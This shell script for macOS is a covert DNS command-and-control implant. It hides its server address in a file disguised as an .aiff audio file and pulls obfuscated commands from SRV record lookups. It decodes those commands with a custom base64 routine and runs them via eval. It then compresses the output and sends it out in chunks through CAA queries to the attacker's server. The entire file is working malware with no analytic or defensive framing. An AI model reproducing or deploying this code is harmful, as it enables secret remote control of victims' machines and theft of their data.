#!/bin/sh
# skiterna
set -x -o pipefail

# TODO: Use domain names from /etc/resolv.conf

readonly _HOSTNAME=$(hostname)
readonly MAGIC_NUM=$(echo $_HOSTNAME | cksum | cut -c1-5)
readonly MAGIC_WORD=$(tail -n $MAGIC_NUM /usr/share/dict/web2 | head -n1)
readonly MAGIC_NUM2=$(stat -f %m /etc | cut -c6-12)
readonly MAGIC_WORD2=$(tail -n $MAGIC_NUM2 /usr/share/dict/web2 | head -n1)
readonly ID="${MAGIC_NUM}.${MAGIC_NUM2}"

d64(){ local N=0 V=0 C;while :;do((V<<=6,++N));IFS= read -n1 C&&{ printf -vC '%d' "'$C";((C=C>64&&C<91?C-65:C>96&&C<123?C-71:C>47&&C<58?C+4:C==43?62:C==47?63:(V>>=6,--N,0),V|=C));};((N==4))&&{ for((N-=2;N>=0;--N));do printf `printf '\\\\x%02X' $((V>>N*8&255))`;done;[ -z "$C" ]&&break;((V=N=0));};done;}

paths="/Library/Preferences/Audio/Data /tmp"
for path in $paths; do
    if [[ -w "${path}" ]]; then
        readonly _CFG_PATH="${path}/${MAGIC_WORD}.aiff"
    fi
done

remote=$(tr 012. .201 < $_CFG_PATH)

readonly SRV_RECORD=$(echo _${MAGIC_WORD}._${MAGIC_WORD2}.local. | tr 'A-Z' 'a-z')

kw=$(echo ${MAGIC_WORD} ${MAGIC_WORD2} | tr 'A-Z' 'a-z' | sed s/'\(.\)'/'\1\n'/g| sort -u | xargs | sed s/" "/""/g )
raw=$(nslookup -q=srv "${SRV_RECORD}" "${remote}" | grep -o "_loc_.*")
enc_cmd=$(echo "${raw}" | sed -e s/_loc_\.// -e s/\.local\.// -e 's/"\/"//g')

# enc=" $(echo $kw | cut -c1);$(echo $kw | cut -c2-4)|$(echo $kw | cut -c6-8)-$(echo $kw | cut -c9-12)&$(echo $kw | cut -c13-)"
enc="$(echo $kw | cut -c1-6) "
dec="$(echo "${enc}" | rev | tail -n1)"

tmp_path="${_CFG_PATH}.tmp"
if [[ ! -e "${tmp_path}" ]]; then
    ln -s /usr/bin/base64 "${tmp_path}"
fi

# consider uudecode instead!
b=$(echo "${enc_cmd}" | sed s/__/"="/g | tr "${enc}" "${dec}")
cmd=$(echo "$b" | d64)
out=$(eval $cmd)

echo "out: ${out}"

pre_split=$(mktemp)
echo "${out}" | compress -c | "${tmp_path}" base64 > "${pre_split}"
size=$(stat -f %z "${pre_split}")
rm "${tmp_path}"
cd "${TMPDIR}"

split -b 63 "${pre_split}" "${MAGIC_NUM}."
chunk_id=0

for chunk in ${MAGIC_NUM}.*; do
    chunk_id=$(expr $chunk_id + 1)
    CAA_RECORD="${MAGIC_NUM}.${size}.$(cat $chunk)"
    raw=$(nslookup -q=caa "${CAA_RECORD}" "${remote}" | grep -o "_caa_.*")
    rm "${chunk}"
done

